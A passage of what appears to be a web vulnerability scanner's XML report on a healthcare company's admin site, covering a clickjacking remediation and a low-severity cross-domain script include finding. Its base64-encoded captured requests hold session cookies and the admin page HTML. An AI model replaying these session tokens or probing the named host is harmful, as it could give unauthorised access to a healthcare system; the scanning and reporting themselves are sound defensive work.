    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/clickjacking">Web Security Academy: Clickjacking</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li><li><a href="https://cwe.mitre.org/data/definitions/1021.html">CWE-1021: Improper Restriction of Rendered UI Layers or Frames</a></li><li><a href="https://capec.mitre.org/data/definitions/103.html">CAPEC-103: Clickjacking</a></li></ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQ29va2llOiBQSFBTRVNTSUQ9a2FqNjEwbTBycGdxcTRhaWNzdW1hZ29mNHM7IHNjcmVlbldpZHRoPTEzNjg7IEFXU0FMQj10ZXMyaWxwV3h2MnZBMWZ6amdmVEFPMzdCbVRzdHZBS3dKWHZlai9SRVB3ZFVWTURyZFlxaUVTRG9VV2Y5WTJHKzA5bW52UC9oSTREVVczZkc0ekQwb0FxNmNDQVdxelRhSndzOHpVRlBQV3BkRmF1R1N4UWJ0R0hHc04wOyBBV1NBTEJDT1JTPXRlczJpbHBXeHYydkExZnpqZ2ZUQU8zN0JtVHN0dkFLd0pYdmVqL1JFUHdkVVZNRHJkWXFpRVNEb1VXZjlZMkcrMDltbnZQL2hJNERVVzNmRzR6RDBvQXE2Y0NBV3F6VGFKd3M4elVGUFBXcGRGYXVHU3hRYnRHSEdzTjANCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuOQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtVXNlcjogPzENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUNoLVVhOiAiQ2hyb21pdW0iO3Y9IjEzMSIsICJOb3RfQSBCcmFuZCI7dj0iMjQiDQpTZWMtQ2gtVWEtTW9iaWxlOiA/MA0KU2VjLUNoLVVhLVBsYXRmb3JtOiAiTGludXgiDQpSZWZlcmVyOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2xvZ2luDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpQcmlvcml0eTogdT0wLCBpDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5305997514876285952</serialNumber>
    <type>5244160</type>
    <name><![CDATA[Cross-domain script include]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/]]></path>
    <location><![CDATA[/]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>When an application includes a script from an external domain, this script is executed by the browser within the security context of the invoking application. The script can therefore do anything that the application's own scripts can do, such as accessing application data and performing actions within the context of the current user.</p>
<p>If you include a script from an external domain, then you are trusting that domain with the data and functionality of your application, and you are trusting the domain's own security to prevent an attacker from modifying the script to perform malicious actions within your application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Scripts should ideally not be included from untrusted domains. Applications that rely on static third-party scripts should consider using Subresource Integrity to make browsers verify them, or copying the contents of these scripts onto their own domain and including them from there. If that is not possible (e.g. for licensing reasons) then consider reimplementing the script's functionality within application code.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity">Subresource Integrity</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/829.html">CWE-829: Inclusion of Functionality from Untrusted Control Sphere</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The response dynamically includes the following scripts from other domains:<ul><li>https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js</li><li>https://cdnjs.cloudflare.com/ajax/libs/jspdf/1.3.4/jspdf.min.js</li></ul>]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js]]></issueDetailItem>
      <issueDetailItem><![CDATA[https://cdnjs.cloudflare.com/ajax/libs/jspdf/1.3.4/jspdf.min.js]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQ29va2llOiBQSFBTRVNTSUQ9a2FqNjEwbTBycGdxcTRhaWNzdW1hZ29mNHM7IHNjcmVlbldpZHRoPTEzNjg7IEFXU0FMQj10ZXMyaWxwV3h2MnZBMWZ6amdmVEFPMzdCbVRzdHZBS3dKWHZlai9SRVB3ZFVWTURyZFlxaUVTRG9VV2Y5WTJHKzA5bW52UC9oSTREVVczZkc0ekQwb0FxNmNDQVdxelRhSndzOHpVRlBQV3BkRmF1R1N4UWJ0R0hHc04wOyBBV1NBTEJDT1JTPXRlczJpbHBXeHYydkExZnpqZ2ZUQU8zN0JtVHN0dkFLd0pYdmVqL1JFUHdkVVZNRHJkWXFpRVNEb1VXZjlZMkcrMDltbnZQL2hJNERVVzNmRzR6RDBvQXE2Y0NBV3F6VGFKd3M4elVGUFBXcGRGYXVHU3hRYnRHSEdzTjANCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuOQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtVXNlcjogPzENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUNoLVVhOiAiQ2hyb21pdW0iO3Y9IjEzMSIsICJOb3RfQSBCcmFuZCI7dj0iMjQiDQpTZWMtQ2gtVWEtTW9iaWxlOiA/MA0KU2VjLUNoLVVhLVBsYXRmb3JtOiAiTGludXgiDQpSZWZlcmVyOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2xvZ2luDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpQcmlvcml0eTogdT0wLCBpDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzoyOTo0MyBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpTZXQtQ29va2llOiBBV1NBTEI9TEFyaHIwTkI0K04xai9WVWZ0YUMvcGM2NUkzeHU3dkFYeVpEamIzZTdqRExEUzdyNjErUGw0Vzdkbzl0QnUzaHZITFVpOVBYbDFOYkNYMXc0dytqT2tGcVZsY3FlN0JFQTl0RmN4Q1ppMjJmSU5vL1RTMlMxK2ZYTGwzWDsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjI5OjQzIEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPUxBcmhyME5CNCtOMWovVlVmdGFDL3BjNjVJM3h1N3ZBWHlaRGpiM2U3akRMRFM3cjYxK1BsNFc3ZG85dEJ1M2h2SExVaTlQWGwxTmJDWDF3NHcrak9rRnFWbGNxZTdCRUE5dEZjeENaaTIyZklOby9UUzJTMStmWExsM1g7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzoyOTo0MyBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjwhLS1IZWFkZXIgQkVHSU4tLT4KPCFET0NUWVBFIGh0bWw+CjxodG1sPgogICAgICAgIDxoZWFkPgogICAgICAgIDx0aXRsZT5NaXJhZG9yIEluc2lnaHRzPC90aXRsZT4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9Ik1pcmFkb3IgSGVhbHRoIj4KICAgICAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCwgbWF4aW11bS1zY2FsZT0xLjAsIHVzZXItc2NhbGFibGU9bm8iIC8+CiAgICAgICAgPGxpbmsgcmVsPSJpY29uIiB0eXBlPSJpbWFnZS9pY28iIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vaW1hZ2VzL2Zhdmljb24uaWNvIi8+CgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3Mvc2VsZWN0Mi5taW4uY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2RhdGVyYW5nZXBpY2tlci5jc3MiPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvZm9udGF3ZXNvbWUtZnJlZS1hbGwubWluLmNzcyI+CiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2Nzcy9kYXRhVGFibGVzLmJvb3RzdHJhcDQuY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL3Jlc3BvbnNpdmUuYm9vdHN0cmFwNC5jc3MiPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvYnV0dG9ucy5ib290c3RyYXA0LmNzcyI+CiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2Nzcy9hZG1pbmx0ZS5taW4uY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2Jvb3RzdHJhcC1kYXRlcGlja2VyLm1pbi5jc3MiPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvZm9udC1hd2Vzb21lLm1pbi5jc3MiPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvYm9vdHN0cmFwLWRhdGVwaWNrZXIubWluLmNzcyI+CiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2Nzcy9tYWluLmNzcz92PTZlYzQyMSI+CgogICAgICAgIDxzY3JpcHQ+dmFyIHRoZW1lQ29va2llTmFtZSA9ICczOTk6OnRoZW1lJzwvc2NyaXB0PjxzY3JpcHQ+dmFyIGFjdGl2ZVRoZW1lID0gJ2xpZ2h0Jzwvc2NyaXB0PiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2Nzcy9tYWluLWxpZ2h0LmNzcz92PTZlYzQyMSI+CgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9mb250cy9zdHlsZXNoZWV0LmNzcyI+CiAgICAgICAgPHNjcmlwdD4KICAgICAgICAgICAgZG9jdW1lbnQuY29va2llID0gInNjcmVlbldpZHRoPSIrc2NyZWVuLndpZHRoKyI7MzA7cGF0aD0vIjsKICAgICAgICA8L3NjcmlwdD4KICAgIDwvaGVhZD4KICAgIDxib2R5IGNsYXNzPSJsYXlvdXQtdG9wLW5hdiBiZy1jb2xvci13aGl0ZSI+CiAgICAgICAgPGRpdiBjbGFzcz0id3JhcHBlciIgc3R5bGU9InBhZGRpbmc6IDFyZW07Ij4KICAgICAgICAgICAgPG5hdiBjbGFzcz0ibWFpbi1oZWFkZXIgbmF2YmFyIj4KICAgICAgICAgICAgICAgIDwhLS0gTGVmdCBuYXZiYXIgbGlua3MgLS0+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtOSBjb2wtc20tOSBjb2wtbWQtOSBjb2wtbGctOSBjb2wteGwtMyBwLTAgZC1mbGV4Ij4KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tLyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxpbWcgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2ltYWdlcy9sb2dvX2JsdWUucG5nIiBhbHQ9Ik1pcmFkb3IgTG9nbyIgY2xhc3M9ImJyYW5kLWltYWdlIiBzdHlsZT0ibWFyZ2luOiAwOyBoZWlnaHQ6IDQwcHg7Ij4KICAgICAgICAgICAgICAgICAgICA8L2E+CiAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImQtZmxleCI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0taW5saW5lIG1sLTMiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAgaW5wdXQtZ3JvdXAtc20iPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBjbGFzcz0iZm9ybS1jb250cm9sIiB0eXBlPSJzZWFyY2giIHBsYWNlaG9sZGVyPSJTZWFyY2giIGFyaWEtbGFiZWw9IlNlYXJjaCIgb25rZXl1cD0iYWR2U2VhcmNoKHRoaXMudmFsdWUpIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbnB1dC1ncm91cC1hcHBlbmQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4gYnRuLW5hdmJhciBzZWFyY2gtYnRuIiB0eXBlPSJzdWJtaXQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1zZWFyY2giPjwvaT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9idXR0b24+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9zcGFuPgogICAgICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICAgICAgPCEtLSBSaWdodCBuYXZiYXIgbGlua3MgLS0+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3cgY29sLXhsLTkgcC0wIHJpZ2h0LWhlYWRlciBkLW5vbmUgZC14bC1mbGV4IG0tMCI+CiAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImNvbG9yLWRhcmstZ3JleSIgc3R5bGU9Im1hcmdpbjogYXV0byAxcmVtIGF1dG8gMDsiPgogICAgICAgICAgICAgICAgICAgICAgICA8Yj5UaW1lIGlzIGRpc3BsYXllZCBpbiBVVEM8L2I+CiAgICAgICAgICAgICAgICAgICAgPC9zcGFuPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9Im5hdi1pdGVtIGRyb3Bkb3duIG15LWF1dG8iPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJodHRwczovL21pcmFkb3JoZWFsdGgub2Rvby5jb20vIiBjbGFzcz0iZHJvcGRvd24taXRlbSBuYXYtaWNvbnMiIHN0eWxlPSJwYWRkaW5nOiAwIC4yNXJlbTsiIHRhcmdldD0iX2JsYW5rIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpIGNsYXNzPSJmYSBmYS1xdWVzdGlvbiBuYXYtaWNvbiIgYXJpYS1oaWRkZW49InRydWUiIHN0eWxlPSJmb250LXNpemU6IDEuN3JlbTsiPjwvaT4KICAgICAgICAgICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICAgICAgICAgIDwvc3Bhbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9Im5hdi1pdGVtIGRyb3Bkb3duIG15LWF1dG8iPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0iZHJvcGRvd24taXRlbSBuYXYtaWNvbnMiIGRhdGEtdG9nZ2xlPSJkcm9wZG93biIgaHJlZj0iIyIgc3R5bGU9InBhZGRpbmc6IDAgLjI1cmVtOyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW1nIHNyYz0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9maWxlcy9wcm9maWxlX2ltYWdlcy8zOTkucG5nPzQ0OTYiIHdpZHRoPSIzMCIgaGVpZ2h0PSIzMCI+ICAgICAgICAgICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkcm9wZG93bi1tZW51IGRyb3Bkb3duLW1lbnUtbGcgZHJvcGRvd24tbWVudS1yaWdodCIgc3R5bGU9Im1hcmdpbi10b3A6IDAuNXJlbTsiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyUHJvZmlsZS8zOTkiIGNsYXNzPSJkcm9wZG93bi1pdGVtIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aSBjbGFzcz0iZmEgZmEtZXh0ZXJuYWwtbGluayBtci0yIGJ0biI+PC9pPiBQcm9maWxlIFNldHRpbmdzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkcm9wZG93bi1kaXZpZGVyIj48L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9ImphdmFzY3JpcHQ6Y2hhbmdlVGhlbWUoJ2xpZ2h0JykiIGNsYXNzPSJkcm9wZG93bi1pdGVtIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aSBjbGFzcz0iZmEgZmEtY2lyY2xlIG1yLTIgYnRuIiBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjojQ0JFRUYxO2NvbG9yOiNDQkVFRjE7Ij48L2k+IExpZ2h0IChEZWZhdWx0KSBUaGVtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZHJvcGRvd24tZGl2aWRlciI+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OmNoYW5nZVRoZW1lKCdicmlnaHQnKSIgY2xhc3M9ImRyb3Bkb3duLWl0ZW0iPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpIGNsYXNzPSJmYSBmYS1jaXJjbGUgbXItMiBidG4iIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiMyNUI5QzA7O2NvbG9yOiMyNUI5QzA7Ij48L2k+IEJyaWdodCBUaGVtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZHJvcGRvd24tZGl2aWRlciI+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OmNoYW5nZVRoZW1lKCdkYXJrJykiIGNsYXNzPSJkcm9wZG93bi1pdGVtIGJ0biI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGkgY2xhc3M9ImZhIGZhLWNpcmNsZSBtci0yIGJ0biIgc3R5bGU9ImJhY2tncm91bmQtY29sb3I6IzQ0MUIzRDs7Y29sb3I6IzQ0MUIzRDsiPjwvaT4gRGFyayBUaGVtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZHJvcGRvd24tZGl2aWRlciI+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2xvZ291dCIgY2xhc3M9ImRyb3Bkb3duLWl0ZW0iPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpIGNsYXNzPSJmYSBmYS1zaWduLW91dCBtci0yIGJ0biI+PC9pPiBMb2dvdXQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9zcGFuPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkLWZsZXggZC14bC1ub25lIj4KICAgICAgICAgICAgICAgICAgICA8dWwgY2xhc3M9Im5hdiBuYXYtcGlsbHMgbWwtYXV0byI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0gZHJvcGRvd24gbXktYXV0byI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBkYXRhLXRvZ2dsZT0iZHJvcGRvd24iIGhyZWY9IiMiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpIGNsYXNzPSJmYSBmYS1jb2ciIGFyaWEtaGlkZGVuPSJ0cnVlIiBzdHlsZT0iY29sb3I6IGRhcmtncmF5OyBmb250LXNpemU6IDEuNXJlbTsiPjwvaT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRyb3Bkb3duLW1lbnUgZHJvcGRvd24tbWVudS1yaWdodCIgc3R5bGU9IiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImRyb3Bkb3duLWl0ZW0gY3Vyc29yUG9pbnRlciI+VGltZSBpcyBkaXNwbGF5ZWQgaW4gVVRDPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0iZHJvcGRvd24taXRlbSIgaHJlZj0iaHR0cHM6Ly9taXJhZG9yaGVhbHRoLm9kb28uY29tLyIgdGFyZ2V0PSJfYmxhbmsiPkhlbHA8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImRyb3Bkb3duLWl0ZW0iIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vRW1haWwiPk5vdGlmaWNhdGlvbnM8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImRyb3Bkb3duLWl0ZW0iIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclByb2ZpbGUvMzk5Ij5Qcm9maWxlPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9ImphdmFzY3JpcHQ6Y2hhbmdlVGhlbWUoJ2xpZ2h0JykiIGNsYXNzPSJkcm9wZG93bi1pdGVtIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGkgY2xhc3M9ImZhIGZhLWNpcmNsZSBtci0yIiBzdHlsZT0iY29sb3I6I0NCRUVGMTsiPjwvaT4gTGlnaHQgKERlZmF1bHQpIFRoZW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9ImphdmFzY3JpcHQ6Y2hhbmdlVGhlbWUoJ2JyaWdodCcpIiBjbGFzcz0iZHJvcGRvd24taXRlbSI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpIGNsYXNzPSJmYSBmYS1jaXJjbGUgbXItMiIgc3R5bGU9ImNvbG9yOiMyNUI5QzA7Ij48L2k+IEJyaWdodCBUaGVtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OmNoYW5nZVRoZW1lKCdkYXJrJykiIGNsYXNzPSJkcm9wZG93bi1pdGVtIGJ0biI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpIGNsYXNzPSJmYSBmYS1jaXJjbGUgbXItMiIgc3R5bGU9ImNvbG9yOiM0NDFCM0Q7Ij48L2k+IERhcmsgVGhlbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImRyb3Bkb3duLWl0ZW0iIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vbG9nb3V0Ij5Mb2dvdXQ8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgICAgICA8L3VsPgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0ibW9iaWxlLW1lbnUiIGNsYXNzPSJuYXYgbmF2LXBpbGxzIG1sLWF1dG8gbXQtYXV0byBtYi1hdXRvIHBsLTMgZC1tZC1ub25lIGQtbGctbm9uZSI+CiAgICAgICAgICAgICAgICAgICAgICAgIDx1bCBjbGFzcz0ibmF2LWl0ZW0gZHJvcGRvd24gcGwtMCIgc3R5bGU9Imxpc3Qtc3R5bGUtdHlwZTogbm9uZTsgZGlzcGxheTogY29udGVudHM7Ij4KICAgICA